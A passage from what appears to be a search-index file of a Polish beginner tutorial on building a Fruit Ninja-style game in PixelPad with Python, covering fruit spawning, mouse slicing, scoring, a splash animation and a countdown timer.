Loop). Potrzebna nam b\u0119dzie losowo\u015b\u0107, wi\u0119c na g\u00f3rze kodu importujemy odpowiedni\u0105 funkcj\u0119. Tym razem skorzystamy z losowych liczb rzeczywistych, kt\u00f3re uzyskamy za pomoc\u0105 funkcji <code>random</code>:</p> <pre><code>from random import random\n</code></pre> <p>Jak wida\u0107, funkcja nazywa si\u0119 tak samo jak biblioteka. Skorzystamy z warto\u015bci losowych zwracanych przez funkcj\u0119 <code>random</code> aby zadecydowa\u0107, czy doda\u0107 nowy owoc do gry w danej klatce animacji. Funkcja random zwraca liczb\u0119 rzeczywist\u0105 z przedzia\u0142u \\(&lt;0, 1)\\).</p> <p>Za\u0142o\u017cenie jest proste: w ka\u017cdej klatce animacji losujemy liczb\u0119 rzeczywist\u0105. Je\u015bli warto\u015b\u0107 tej liczby jest mniejsza ni\u017c jaka\u015b ma\u0142a warto\u015b\u0107, np. \\(0.02\\), to dodajemy nowy owoc do gry. </p> <p>W klasie Game w cz\u0119\u015bci aktualizacyjnej (zak\u0142adka Loop) dopisujemy na ko\u0144cu kodu:</p> <pre><code>if random() &lt;= 0.02:\n    Fruit()\n</code></pre> <p>Podobnie jak wcze\u015bniej, nie musimy zapisywa\u0107 nowych owoc\u00f3w do zmiennej. Wystarczy, \u017ce b\u0119dziemy je tworzy\u0107.</p> <p>Teraz warto uruchomi\u0107 gr\u0119 i zobaczy\u0107, jak nowe owoce pojawiaj\u0105 si\u0119 na ekranie. Warto dostosowa\u0107 warto\u015b\u0107 w naszym warunku tak, by odpowiada\u0142a naszym oczekiwaniu. Im wi\u0119ksza warto\u015b\u0107, tym owoce b\u0119d\u0105 si\u0119 cz\u0119\u015bciej pojawia\u0107. A im mniejsza, tym rzadziej b\u0119d\u0105 si\u0119 pojawia\u0107.</p> <p>Warto pami\u0119ta\u0107, \u017ce nie jest to najlepszy spos\u00f3b na losowe dodawanie nowych element\u00f3w do gry, ale jest bardzo prosty i na tym poprzestaniemy.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#obracanie","title":"Obracanie","text":"<p>Wiele owoc\u00f3w lataj\u0105cych po ekranie to \u0142adny widok. Wci\u0105\u017c s\u0105 one jednak do\u015b\u0107 statyczne. Owoc lec\u0105cy w powietrzu zazwyczaj si\u0119 w jaki\u015b spos\u00f3b obraca. Mo\u017cemy to z \u0142atwo\u015bci\u0105 zasymulowa\u0107.</p> <p>W klasie Fruit w cz\u0119\u015bci aktualizuj\u0105cej (zak\u0142adka Loop), b\u0119dziemy zmienia\u0107 obr\u00f3t owocu (<code>self.angle</code>) o jak\u0105\u015b niewielk\u0105 warto\u015b\u0107. Aby owoc obraca\u0142 si\u0119 zgodnie z ruchem wskaz\u00f3wek zegara, b\u0119dziemy zmniejsza\u0107 zwarto\u015b\u0107 zmiennej <code>angle</code>. Dopisujemy na ko\u0144cu kodu:</p> <pre><code>self.angle -= 0.5\n</code></pre> <p>Teraz nasze owoce b\u0119d\u0105 obraca\u0107 si\u0119 w trakcie swojej podr\u00f3\u017cy.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#usuwanie-owocow","title":"Usuwanie owoc\u00f3w","text":"<p>Gdy nasze owoce wypadn\u0105 poza ekran, to ju\u017c ich wi\u0119cej nie zobaczymy. To nie oznacza jednak, \u017ce nie ma ich w grze! B\u0119d\u0105 sobie spada\u0107 i spada\u0107 w d\u00f3\u0142, w niesko\u0144czono\u015b\u0107. Przy d\u0142u\u017cszej rozgrywce mo\u017ce to okaza\u0107 si\u0119 problematyczne, poniewa\u017c komputer wci\u0105\u017c b\u0119dzie musia\u0142 wylicza\u0107 i aktualizowa\u0107 ich pozycj\u0119, chocia\u017c nawet nie b\u0119dziemy ich ju\u017c widzie\u0107. Dlatego warto posprz\u0105ta\u0107 po sobie. Gdy owoc wypadnie poza ekran gry, to go skasujemy.</p> <p>Przechodzimy do klasy Fruit. W cz\u0119\u015bci aktualizacyjnej (zak\u0142adka Loop) sprawdzimy, czy pozycja pionowa (\\(y\\)) owocu jest odpowiednio ma\u0142a, np. mniejsza ni\u017c \\(-500\\). Je\u017celi tak, to usuniemy owoc z gry za pomoc\u0105 funkcji <code>destroy</code> do kt\u00f3rej przekazujemy jeden parametr: obiekt z gry do usuni\u0119ci\u0105. W naszym przypadku b\u0119dzie to obecny owoc, czyli <code>self</code>. Dopisujemy wi\u0119c na ko\u0144cu kodu:</p> <pre><code>if self.y &lt; -500:\n    destroy(self)\n</code></pre> <p>Teraz gdy nasze owoce wypadn\u0105 poza ekran, to zostan\u0105 skasowane. Nie zobaczymy tego bezpo\u015brednio po uruchomieniu gry, ale jest to wa\u017cny element ca\u0142ego procesu.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#apanie-owocow","title":"\u0141apanie owoc\u00f3w","text":"<p>C\u00f3\u017c to za Fruit Ninja, w kt\u00f3rym nie mo\u017cemy \u0142apa\u0107 naszych owoc\u00f3w. Teraz zajmiemy si\u0119 dodaniem g\u0142\u00f3wnej funkcjonalno\u015bci w naszej grze.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#grafika_2","title":"Grafika","text":"<p>Owoce b\u0119dziemy \u0142apa\u0107 za pomoc\u0105 myszki. Niemniej przyda nam si\u0119 grafika do reprezentowania naszej pozycji na ekranie. Skorzystamy z grafiki o nazwie slicer: ma\u0142ej bia\u0142ej kropki. Klikamy na plusik przy Sprites w menu po lewej stronie, szukamy grafiki, dodajemy j\u0105 i zapisujemy pod nazw\u0105 slicer.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#klasa_2","title":"Klasa","text":"<p>Tak jak i wcze\u015bniej, potrzebujemy mie\u0107 now\u0105 klas\u0119. Klikamy plusik przy Classes i dodajemy klas\u0119 o nazwie Slicer.</p> <p>W naszej nowej klasie, w cz\u0119\u015bci inicjalizuj\u0105cej (zak\u0142adka Start), przypisujemy grafik\u0119 do nowego obiektu, podobnie jak poprzednio:</p> <pre><code>self.sprite = sprite(\"slicer.png\")\n</code></pre>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#gra_2","title":"Gra","text":"<p>Aby nasz slicer pojawi\u0142 si\u0119 w grze, musimy utworzy\u0107 jego obiekt. Przechodzimy do klasy Game i w cz\u0119\u015bci inicjalizacyjnej (zak\u0142adka Start) tworzymy nowy obiekt <code>Slicer()</code> i zapisujemy go w zmiennej w grze o nazwie <code>slicer</code>. Ca\u0142o\u015b\u0107 dopisujemy na ko\u0144cu kodu.</p> <pre><code>self.slicer = Slicer()\n</code></pre>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#poruszanie","title":"Poruszanie","text":"<p>Naszym nowym elementem b\u0119dziemy sterowa\u0107 za pomoc\u0105 myszki. Jego pozycja powinna zawsze znajdowa\u0107 si\u0119 tam, gdzie sama myszka. W tym celu przechodzimy do klasy Slicer. W cz\u0119\u015bci aktualizuj\u0105cej (zak\u0142adka Loop) b\u0119dziemy przypisywa\u0107 obecn\u0105 pozycj\u0119 myszki do pozycji obiektu. Wsp\u00f3\u0142rz\u0119dne myszki uzyskamy za pomoc\u0105 funkcji <code>mouse_x()</code> oraz <code>mouse_y()</code>. Funkcje nie przyjmuj\u0105 \u017cadnych parametr\u00f3w.</p> <p>Dopisujemy wi\u0119c do naszego kodu dwie linijki:</p> <pre><code>self.x = mouse_x()\nself.y = mouse_y()\n</code></pre> <p>Teraz nasz slicer b\u0119dzie tam, gdzie wska\u017anik naszej myszy w trakcie gry.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#apanie-owocow_1","title":"\u0141apanie owoc\u00f3w","text":"<p>Gdy b\u0119dziemy trzyma\u0107 lewy przycisk myszy i najedziemy kursorem na owoc, to ten powinien zosta\u0107 uznany za z\u0142apany i w efekcie znikn\u0105\u0107 z ekranu. T\u0119 funkcjonalno\u015b\u0107 zaimplementujemy w klasie Slicer w cz\u0119\u015bci aktualizuj\u0105cej.</p> <p>Na pocz\u0105tku sprawdzimy, czy wci\u015bni\u0119ty jest lewy przycisk myszy. Do tego skorzystamy z funkcji <code>mouse_is_pressed</code>, kt\u00f3ra jako parametr przyjmuje nazw\u0119 przycisku, kt\u00f3ry chcemy sprawdzi\u0107. Dopisujemy wi\u0119c do naszego kodu, na ko\u0144cu:</p> <pre><code>if mouse_is_pressed(\"left\"):\n</code></pre> <p>Teraz sprawdzimy, czy jeste\u015bmy w kolizji z jakim\u015b owocem. Mo\u017cemy to zrobi\u0107 za pomoc\u0105 funkcji <code>get_collision</code>, kt\u00f3ra zwr\u00f3ci nam obiekt, w kt\u00f3rym jeste\u015bmy w kolizji, lub warto\u015b\u0107 pust\u0105, je\u017celi nie jeste\u015bmy w kolizji. Do funkcji przekazujemy dwa elementy, kt\u00f3rych kolizj\u0119 chcemy zbada\u0107. Pierwszy to b\u0119dzie nasz obecny obiekt (<code>self</code>), a drugim b\u0119dzie nazwa klasy Fruit, poniewa\u017c chcemy sprawdzi\u0107, czy jeste\u015bmy w kolizji z jakimkolwiek owocem.</p> <p>Dopisujemy wi\u0119c, wewn\u0105trz bloku naszej instrukcji warunkowej:</p> <pre><code>if mouse_is_pressed(\"left\"):\n    fruit = get_collision(self, \"Fruit\")\n</code></pre> <p>Teraz pozosta\u0142o nam sprawdzi\u0107, czy jaki\u015b owoc zosta\u0142 zwr\u00f3cony.</p> <pre><code>if mouse_is_pressed(\"left\"):\n    fruit = get_collision(self, \"Fruit\")\n    if fruit:\n</code></pre> <p>Je\u017celi tak, to go usuniemy z gry za pomoc\u0105 funkcji <code>destroy</code>.</p> <pre><code>if mouse_is_pressed(\"left\"):\n    fruit = get_collision(self, \"Fruit\")\n    if fruit:\n        destroy(fruit)\n</code></pre> <p>Je\u017celi teraz przetestujemy gr\u0119, to powinni\u015bmy m\u00f3c \u0142apa\u0107 nasze owoce. \u015awietnie!</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#punkty","title":"Punkty","text":"<p>C\u00f3\u017c to za gra bez punkt\u00f3w. W naszej grze b\u0119dziemy dostawa\u0107 punkty za ka\u017cdy trafiony owoc, a traci\u0107, za ka\u017cdy kt\u00f3ry wypadnie poza ekran.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#tekst","title":"Tekst","text":"<p>Zaczniemy do dodania do naszej gry napisu wy\u015bwietlaj\u0105cego punkty na ekranie. W tym celu przechodzimy do klasy Game. W cz\u0119\u015bci inicjalizuj\u0105cej (zak\u0142adka Start) utworzymy nowy tekst za pomoc\u0105 funkcji <code>text</code> i zapiszemy go w zmiennej w grze o nazwie <code>points_text</code>. Funkcja <code>text</code> przyjmuje trzy parametry: tekst do wy\u015bwietlenia oraz jego wsp\u00f3\u0142rz\u0119dne na ekranie. Punkty umie\u015bcimy w lewym g\u00f3rnym rogu naszej gry. Dopisujemy wi\u0119c na ko\u0144cu kodu.</p> <pre><code>self.points_text = text(\"Punkty: 0\", -600, 350)\n</code></pre> <p>Teraz powinni\u015bmy ju\u017c zobaczy\u0107 nasze punkty po uruchomieniu gry. Oczywi\u015bcie nie b\u0119d\u0105 si\u0119 jeszcze zmienia\u0107.</p> <p>Dla lepszego efektu zmienimy kolor dodanego tesktu, odwo\u0142uj\u0105c si\u0119 do w\u0142asno\u015bci <code>color</code> w zmiennej <code>points_text</code>. Kolor mo\u017cemy poda\u0107 za pomoc\u0105 angielskiej nazwy, albo w kodzie szesnastkowym.</p> <pre><code>self.points_text.color = \"#F18805\"\n</code></pre> <p>Zmie\u0144my tak\u017ce rozmiar tekstu. Powinien by\u0107 odpowiednio du\u017cy i czytelny. To zrobimy odwo\u0142uj\u0105c si\u0119 do w\u0142asno\u015bci <code>fontSize</code>.</p> <pre><code>self.points_text.fontSize = 80\n</code></pre>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#zliczanie","title":"Zliczanie","text":"<p>Mamy ju\u017c spos\u00f3b na wy\u015bwietlanie punkt\u00f3w, mo\u017cemy przej\u015b\u0107 do ich zliczania. Punkty b\u0119dziemy pami\u0119ta\u0107 w zmiennej <code>points</code> w klasie Game. Dopisujemy wi\u0119c w cz\u0119\u015bci inicjalizuj\u0105cej:</p> <pre><code>self.points = 0\n</code></pre> <p>Zmienimy tak\u017ce jego warto\u015b\u0107 na ekranie. W tym celu zmienimy tekst, kt\u00f3ry wy\u015bwietla nam punkty. Dopisujemy wi\u0119c w cz\u0119\u015bci aktualizuj\u0105cej (zak\u0142adka Loop):</p> <pre><code>self.points_text.text = \"Punkty: \" + str(self.points)\n</code></pre> <p>Teraz pozosta\u0142o dodawa\u0107 i odejmowa\u0107 punkty. Przechodzimy wi\u0119c najpierw do klasy Slicer. W cz\u0119\u015bci aktualizuj\u0105cej, gdzie wykrywamy kolizj\u0119 z owocem i go usuwamy, dopiszemy zwi\u0119kszanie liczby punkt\u00f3w. Dopisujemy, zaraz pod instrukcj\u0105 <code>destroy(fruit)</code>, zachowuj\u0105c odpowiednie wci\u0119cie:</p> <pre><code>game.points += 1\n</code></pre> <p>Podobnie zrobimy, gdy owoc zniknie poza ekranem. Przechodzimy do cz\u0119\u015bci aktualizuj\u0105cej w klasie <code>Fruit</code>. Zaraz pod instrukcj\u0105 <code>destroy(self)</code>, za pomoc\u0105 kt\u00f3rej usuwamy owoce, kt\u00f3re wypad\u0142y poza ekran, dopisujemy, zachowuj\u0105c odpowiednie wci\u0119cie:</p> <pre><code>game.points -= 1\n</code></pre> <p>Ca\u0142o\u015b\u0107 powinna wygl\u0105da\u0107 tak:</p> <pre><code>if mouse_is_pressed(\"left\"):\n    fruit = get_collision(self, \"Fruit\")\n    if fruit:\n        destroy(fruit)\n        game.points -= 1\n</code></pre> <p>Teraz, gdy uruchomimy gr\u0119, powinni\u015bmy widzie\u0107, jak nasze punkty si\u0119 zmieniaj\u0105. Mo\u017cemy ju\u017c konkurowa\u0107 z innymi o najlepszy wynik!</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#animacja-trafienia","title":"Animacja trafienia","text":"<p>Nasza gra b\u0119dzie wygl\u0105da\u0142a znacznie lepiej, gdy po trafieniu owoc efektownie si\u0119 rozpadnie. W tym celu dodamy odpowiedni\u0105 animacj\u0119.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#grafika_3","title":"Grafika","text":"<p>Zaczynamy od znalezienia odpowiedniej grafiki, a dok\u0142adniej animacji utworzonej z kilku grafik. Klikamy plusik przy Sprites i szukamy Orange Splash, jak pokazano pini\u017cej. Dodajemy i zapisujemy pod nazw\u0105 orangesplash.</p> <p></p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#klasa_3","title":"Klasa","text":"<p>Do wy\u015bwietlania naszej animacji potrzebna nam b\u0119dzie nowa klasa. Klikamy plusik przy Classes i tworzymy klas\u0119 o nazwie Splash. Wykorzystamy j\u0105 do animacji tak\u017ce dla innych owoc\u00f3w, nie tylko pomara\u0144czy.</p> <p>Klasa b\u0119dzie bardzo prosta. Nie b\u0119dziemy w niej inicjalizowa\u0107 samej animacji, zrobimy to z innego miejsca. Tutaj przechowamy wy\u0142\u0105cznie licznik, kt\u00f3ry pos\u0142u\u017cy nam do usuni\u0119cia animacji po odpowiednim czasie. W cz\u0119\u015bci inicjalizuj\u0105cej dopisujemy wi\u0119c zmienn\u0105 do obiektu klasy. Nazwiemy j\u0105 timer i przypiszemy pocz\u0105tkow\u0105 warto\u015b\u0107 r\u00f3wn\u0105 \\(16\\). B\u0119dzie to liczba klatek, po kt\u00f3rej animacja zostanie usuni\u0119ta.</p> <pre><code>self.timer = 16\n</code></pre> <p>W cz\u0119\u015bci aktualizuj\u0105cej b\u0119dziemy zmniejsza\u0107 ten licznik, a gdy dojdzie do zera, to usuniemy nasz obiekt animacji. \u017beby uniezale\u017cni\u0107 si\u0119 od liczby klatek na sekund\u0119, b\u0119dziemy odejmowa\u0107 w ka\u017cdej klatce nie warto\u015b\u0107 \\(1\\), ale warto\u015b\u0107 \\(60\\) podzielon\u0105 przez aktualn\u0105 liczb\u0119 klatek na sekund\u0119. Dlaczego \\(60\\)? W takiej liczbie klatek powinna dzia\u0142a\u0107 nasza gra. Liczb\u0119 klatek na sekund\u0119 otrzymamy za pomoc\u0105 funkcji <code>get_fps()</code>. Dopisujemy wi\u0119c w cz\u0119\u015bci aktualizuj\u0105cej (zak\u0142adka Loop):</p> <pre><code>self.timer -= 60 / get_fps()\n</code></pre> <p>Teraz, gdy licznik osi\u0105gnie warto\u015b\u0107 \\(0\\), usuniemy nasz obiekt animacji.</p> <pre><code>if self.timer &lt;= 0:\n    destroy(self)\n</code></pre>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#przygotowanie-animacji","title":"Przygotowanie animacji","text":"<p>Teraz czas wczyta\u0107 grafiki i utworzy\u0107 z nich animacj\u0119. B\u0119dziemy j\u0105 przechowywa\u0107 w klasie Fruit. Jest to wa\u017cne z tego wzgl\u0119du, \u017ce gdy b\u0119dziemy mieli r\u00f3\u017cne owoce, to trzeba do nich dopasowa\u0107 tak\u017ce animacje. Przechodzimy wi\u0119c do klasy Fruit i cz\u0119\u015bci inicjalizacyjnej (zak\u0142adka Start).</p> <p>Najpierw utworzymy zmienn\u0105, w kt\u00f3rej przechowamy grafiki animacji. B\u0119dzie to zwyk\u0142a, lokalna zmienna, kt\u00f3r\u0105 nazwiemy splash. Przypiszemy do niej wczytan\u0105 grafik\u0119 korzystaj\u0105c z funkcji <code>sprite</code>, do kt\u00f3rej przeka\u017cemy trzy parametry: nazw\u0119 pliku grafiki, liczb\u0119 wierszy oraz liczb\u0119 kolumn. Gdy otworzymy nasz\u0105 za\u0142adowan\u0105 wcze\u015bniej grafik\u0119 orangesplash.png, to zobaczymy, \u017ce sk\u0142ada si\u0119 ona z kilku obrazk\u00f3w: kolejnych klatek animacji. S\u0105 one u\u0142o\u017cone w dwa wiersze i cztery kolumny. Dopisujemy wi\u0119c na koniec kodu:</p> <pre><code>splash = sprite(\"orangesplash.png\", 2, 4)\n</code></pre> <p>Teraz mo\u017cemy na podstawie za\u0142adowanej grafiki utworzy\u0107 w\u0142a\u015bciw\u0105 animacj\u0119. Utworzymy zmienn\u0105 przypisan\u0105 ju\u017c do obiektu naszego owoca, poniewa\u017c b\u0119dzie nam p\u00f3\u017aniej potrzebna w innym miejscu. Zmienn\u0105 nazwiemy <code>splash_animation</code>. Przypiszemy do niej wynik dzia\u0142ania funkcji <code>animation</code>, do kt\u00f3rej przeka\u017cemy cztery parametry: za\u0142adowan\u0105 grafik\u0119 (<code>splash</code>), liczb\u0119 klatek na sekund\u0119 do wy\u015bwietlenia animacji (\\(16\\)), indeks pocz\u0105tkowej klatki z za\u0142adowanych grafik (\\(0\\)), indeks ko\u0144cowej klatki z za\u0142adowanych grafik (\\(7\\)). Animacj\u0119 wy\u015bwietlimy w szesnastu klatkach na sekund\u0119, poniewa\u017c jest kr\u00f3tka i nie chcemy, by tylko mign\u0119\u0142a, ale by\u0142a dobrze widoczna. Jak mo\u017cna zauwa\u017cy\u0107, klatki indeksujemy od zera. Dopisujemy wi\u0119c na koniec kodu:</p> <pre><code>self.splash_animation = animation(splash, 16, 0, 7)\n</code></pre>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#uruchomienie-animacji","title":"Uruchomienie animacji","text":"<p>Teraz, jak ju\u017c mamy wszystko przygotowane, czas przej\u015b\u0107 do uruchomienia animacji w odpowiednim momencie. Chcemy to zrobi\u0107 wtedy, gdy z\u0142apiemy owoc na ekranie. Za \u0142apanie owoc\u00f3w odpowiada Slicer, do niego wi\u0119c przechodzimy. Otwieramy zak\u0142adk\u0119 z kodem aktualizacyjnym (Loop) i szukamy miejsca, w kt\u00f3rym usuwamy z\u0142apany owoc. Fragment kodu, kt\u00f3ry nas interesuje, powinien wygl\u0105da\u0107 mniej wi\u0119cej tak:</p> <pre><code>if mouse_is_pressed(\"left\"):\n    fruit = get_collision(self, \"Fruit\")\n    if fruit:\n        destroy(fruit)\n        game.points += 1\n</code></pre> <p>Teraz, przed instrukcj\u0105 usuwaj\u0105c\u0105 owoc, utworzymy now\u0105 animacj\u0119 i zapiszemy j\u0105 w zmiennej lokalnej splash.</p> <pre><code>if mouse_is_pressed(\"left\"):\n    fruit = get_collision(self, \"Fruit\")\n    if fruit:\n        splash = Splash()\n        destroy(fruit)\n        game.points += 1\n</code></pre> <p>Po utworzeniu zmiennej <code>splash</code> musimy przypisa\u0107 do niej za\u0142adowan\u0105 wcze\u015bniej animacj\u0119 ze zmiennej <code>fruit</code>. To utworzymy korzystaj\u0105c z funkcji <code>set_animation</code> do kt\u00f3rej podajemy dwa parametry: obiekt, do kt\u00f3rego chcemy przypisa\u0107 animacj\u0119 (<code>splash</code>), oraz animacj\u0119, kt\u00f3r\u0105 chcemy przypisa\u0107 (<code>fruit.splash_animation</code>):</p> <pre><code>if mouse_is_pressed(\"left\"):\n    fruit = get_collision(self, \"Fruit\")\n    if fruit:\n        splash = Splash()\n        set_animation(splash, fruit.splash_animation)\n        destroy(fruit)\n        game.points += 1\n</code></pre> <p>Gdy teraz uruchomimy gr\u0119 i z\u0142apiemy owoc to zobaczymy, \u017ce animacja si\u0119 tworzy, ale nie we w\u0142a\u015bciwym miejscu, tylko na \u015brodku ekranu. Oznacza to, \u017ce musimy jeszcze do zmiennej <code>splash</code> przypisa\u0107 odpowiednie wsp\u00f3\u0142rz\u0119dne. Poniewa\u017c chcemy, by animacja pojawi\u0142a si\u0119 w miejscu, w kt\u00f3rym znajduje si\u0119 owoc, przepiszemy wsp\u00f3\u0142rz\u0119dne ze zmiennej <code>fruit</code>:</p> <pre><code>if mouse_is_pressed(\"left\"):\n    fruit = get_collision(self, \"Fruit\")\n    if fruit:\n        splash = Splash()\n        set_animation(splash, fruit.splash_animation)\n        splash.x = fruit.x\n        splash.y = fruit.y\n        destroy(fruit)\n        game.points += 1\n</code></pre> <p>Teraz ju\u017c jest du\u017co lepiej, ale animacja b\u0119dzie do\u015b\u0107 du\u017ca w stosunku do rozmiaru owoca. Mo\u017cemy to zmieni\u0107 modyfikuj\u0105c jej skal\u0119. Zmienimy warto\u015bci dw\u00f3ch zmiennych: <code>splash.scaleX</code> oraz <code>splash.scaleY</code>. S\u0105 to odpowiednio warto\u015bci skali w poziomie i w pionie. Przypiszemy do nich po\u0142ow\u0119 odpowiednich warto\u015bci skali ze zmiennej <code>fruit</code>:</p> <pre><code>if mouse_is_pressed(\"left\"):\n    fruit = get_collision(self, \"Fruit\")\n    if fruit:\n        splash = Splash()\n        set_animation(splash, fruit.splash_animation)\n        splash.x = fruit.x\n        splash.y = fruit.y\n        splash.scaleX = fruit.scaleX/2\n        splash.scaleY = fruit.scaleY/2\n        destroy(fruit)\n        game.points += 1\n</code></pre> <p>Teraz animacja jest ju\u017c gotowa.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#czas-i-koniec-gry","title":"Czas i koniec gry","text":"<p>Nasza gra powinna si\u0119 kiedy\u015b zako\u0144czy\u0107, nie tylko wtedy, gdy si\u0119 ni\u0105 znudzimy. Dodamy licznik czasu, po kt\u00f3rego up\u0142yni\u0119ciu gra si\u0119 zako\u0144czy.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#czas","title":"Czas","text":"<p>Wy\u015bwietlanie i zliczanie czasu zrobimy z poziomu klasy <code>Game</code>. Najpierw zaczniemy od zapami\u0119tania czasu, kt\u00f3ry nam pozosta\u0142. W cz\u0119\u015bci inicjalizuj\u0105cej (zak\u0142adka Start) tworzymy now\u0105 zmienn\u0105 przypisan\u0105 do obiektu gry. Nazwiemy j\u0105 time i ustawimy jej pocz\u0105tkow\u0105 warto\u015b\u0107 na \\(61\\). W ten spos\u00f3b b\u0119dziemy mieli \\(60\\) sekund na rozgrywk\u0119. Dlaczego wi\u0119c ustawiamy \\(61\\) a nie \\(60\\)? Poniewa\u017c ta jedna sekunda zd\u0105\u017cy up\u0142yn\u0105\u0107, zanim gra w\u0142a\u015bciwie wystartuje. Dodajemy now\u0105 zmienn\u0105 na ko\u0144cu kodu.</p> <pre><code>self.time = 61\n</code></pre> <p>Teraz czas wy\u015bwietli\u0107 czas na ekranie. Do tego utworzymy kolejn\u0105 zmienn\u0105 zapisan\u0105 w obiekcie gry, tym razem o nazwie time_text. Przypiszemy do niej tekst utworzony za pomoc\u0105 funkcji <code>text</code>, podobnie jak zrobili\u015bmy z punktami. Licznik czasu umie\u015bcimy w prawym g\u00f3rnym rogu. Nadamy mu tak\u017ce odpowiedni kolor (<code>color</code>) i rozmiar (<code>fontSize</code>).</p> <pre><code>self.time = 61\nself.time_text = text(self.time, 500, 350)\nself.time_text.color = \"#0E1428\"\nself.time_text.fontSize = 80\n</code></pre> <p>Po uruchomieniu powinni\u015bmy ju\u017c widzie\u0107 czas w prawym g\u00f3rnym rogu ekranu gry. Oczywi\u015bcie nie b\u0119dzie si\u0119 jeszcze zmienia\u0142. Tym si\u0119 teraz zajmiemy. Przechodzimy do cz\u0119\u015bci aktualizuj\u0105cej (zak\u0142adka Loop). Na koniec kodu dopiszemy instrukcj\u0119 zmniejszaj\u0105c\u0105 nasz\u0105 zmienn\u0105 <code>time</code> o liczb\u0119 sekund, kt\u00f3re up\u0142yn\u0119\u0142y od ostatniej klatki animacji. W tym celu musimy znowu skorzysta\u0107 z funkcji <code>get_fps()</code>. Najpierw dzielimy \\(60\\) przez liczb\u0119 klatek, a nast\u0119pnie wynik znowy dzielimy na \\(60\\), by uzyska\u0107 sekudny. Ca\u0142o\u015b\u0107 odejmujemy od zmiennej <code>time</code>.</p> <pre><code>self.time -= (60/get_fps()) / 60\n</code></pre> <p>Mo\u017cemy to tak\u017ce upro\u015bci\u0107, skracaj\u0105c:</p> <pre><code>self.time -= 1/get_fps()\n</code></pre> <p>Teraz pozosta\u0142o nam zaktualizowa\u0107 wy\u015bwietlany czas. Poniewa\u017c czas b\u0119dzie teraz liczb\u0105 rzeczywist\u0105, a my chcemy wy\u015bwietla\u0107 tylko pe\u0142ne sekundy, to musimy go zamieni\u0107 na liczb\u0119 ca\u0142kowit\u0105 za pomoc\u0105 funkcji <code>int</code> przypisuj\u0105c go do tekstu.</p> <pre><code>self.time -= (60/get_fps()) / 60\nself.time_text.text = int(self.time)\n</code></pre> <p>Teraz powinni\u015bmy widzie\u0107 zmieniaj\u0105cy si\u0119 czas na ekranie.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#koniec-gry","title":"Koniec gry","text":"<p>Gdy licznik czasu dobiegnie ko\u0144ca gra powinna si\u0119 zatrzyma\u0107. Do tego b\u0119dziemy potrzebowali jednej dodatkowej zmiennej do pami\u0119tania, czy gra si\u0119 ju\u017c zako\u0144czy\u0142a. Dodamy now\u0105 zmienn\u0105 do naszego obiektu gry. Nazwiemy j\u0105 <code>game_over</code> i przypiszemy jej pocz\u0105tkow\u0105 warto\u015b\u0107 <code>False</code>. Now\u0105 zmienn\u0105 dopisujemy na ko\u0144cu w cz\u0119\u015bci inicjalizuj\u0105cej (zak\u0142adka Start).</p> <pre><code>self.game_over = False\n</code></pre> <p>Teraz musimy zmieni\u0107 nasz kod, aby sprawdza\u0142, czy gra si\u0119 zako\u0144czy\u0142a. Wracamy do zak\u0142adki Loop. Najpierw, na samym pocz\u0105tku kodu, sprawdzimy, czy gra si\u0119 ju\u017c zako\u0144czy\u0142a. Je\u017celi tak, to u\u017cyjemy instrukcji <code>return</code> by nie wykonywa\u0107 ju\u017c \u017cadnych wi\u0119cej operacji.</p> <pre><code>if self.game_over:\n    return\n</code></pre> <p>Teraz czas zako\u0144czy\u0107 gr\u0119, gdy licznik czasu spadnie do zera. W tym celu wracamy do miejsca, gdzie aktualizowali\u015bmy nasz czas.</p> <pre><code>self.time -= (60/get_fps()) / 60\nself.time_text.text = int(self.time)\n</code></pre> <p>Pomi\u0119dzy te dwie linijki kodu dodamy instrukcj\u0119 sprawdzaj\u0105c\u0105, czy czas spad\u0142 poni\u017cej zera. Tak b\u0119dzie \u0142atwiej, ni\u017c sprawdza\u0107 czy czas wynosi r\u00f3wne zero, poniewa\u017c pracujemy na liczbach rzeczywistych.</p> <pre><code>self.time -= (60/get_fps()) / 60\n\nif self.time &lt; 0:\n\nself.time_text.text = int(self.time)\n</code></pre> <p>Je\u017celi tak si\u0119 wydarzy, to zrobimy dwie rzeczy: zapami\u0119tamy, \u017ce gra si\u0119 zako\u0144czy\u0142a zmieniaj\u0105c warto\u015b\u0107 zmiennej <code>game_over</code> na <code>True</code> i ustawimy czas na \\(0\\), aby nie wy\u015bwietla\u0107 ujemnych warto\u015bci.</p> <pre><code>self.time -= (60/get_fps()) / 60\n\nif self.time &lt; 0:\n    self.game_over = True\n    self.time = 0\n\nself.time_text.text = int(self.time)\n</code></pre> <p>Teraz gra powinna si\u0119 ko\u0144czy\u0107 wraz z up\u0142ywem czasu.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#napis-konca-gry","title":"Napis ko\u0144ca gry","text":"<p>Warto poinformowa\u0107 gracza stosownym komunikatem, \u017ce gra si\u0119 zako\u0144czy\u0142a. W tym celu utworzymy napis GAME OVER, kt\u00f3ry wy\u015bwietli si\u0119 na \u015brodku ekranu po zako\u0144czeniu gry. Napis pocz\u0105tkowo powinien by\u0107 niewidoczny, dlatego ustawimy jego w\u0142asno\u015b\u0107 <code>visible</code> na <code>False</code>. Poza tym wyr\u00f3wnamy go tak\u017ce w poziomie (<code>halign</code>) oraz w pionie (<code>valign</code>). Wszystko zapiszemy w zmiennej <code>game_over_text</code> w obiekcie gry. Dopisujemy nowy fragment na ko\u0144cu cz\u0119\u015bci inicjalizuj\u0105cej (zak\u0142adka Start).</p> <pre><code>self.game_over_text = 